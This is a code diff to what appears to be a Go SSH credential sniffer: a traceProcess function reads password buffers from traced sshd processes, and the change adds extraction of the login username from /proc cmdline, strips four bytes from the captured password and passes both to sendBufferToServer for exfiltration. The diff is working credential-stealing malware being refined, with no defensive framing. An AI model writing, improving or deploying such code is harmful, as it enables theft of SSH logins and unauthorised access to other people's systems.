@@ -89,12 +89,17 @@ func traceProcess(pid int) {
 					return
 				}
 				if len(buffer) < 250 && len(buffer) > 5 && string(buffer) != "" {
-					// Fix weird hex shit with buffer "\x00\x00\x00\x04test"
+					username := "root"
+					cmdline, _ := ioutil.ReadFile(fmt.Sprintf("/proc/%d/cmdline", pid))
+					matches := regexp.MustCompile(`sshd: ([a-zA-Z]+) \[net\]`).FindSubmatch(cmdline)
+					if len(matches) == 2 {
+						username = string(matches[1])
+					}
 					var password = string(buffer)
 					valid := regexp.MustCompile(`\x00\x00\x00[^\n]*\f$`).MatchString(password)
 					if !valid {
-						fmt.Printf("password: %s\n", password)
-						go sendBufferToServer("root", password)
+						fmt.Printf("username: %q\n password: %q\n", username, removeFirstFourBytes(password))
+						go sendBufferToServer(username, removeFirstFourBytes(password))
 						fmt.Printf("finished \n")
 					}
 				} else {
@@ -156,4 +161,11 @@ func contains(slice []int, value int) bool {
 		}
 	}
 	return false
+}
+
+func removeFirstFourBytes(input string) string {
+	if len(input) < 4 {
+		return ""
+	}
+	return input[4:]
 }
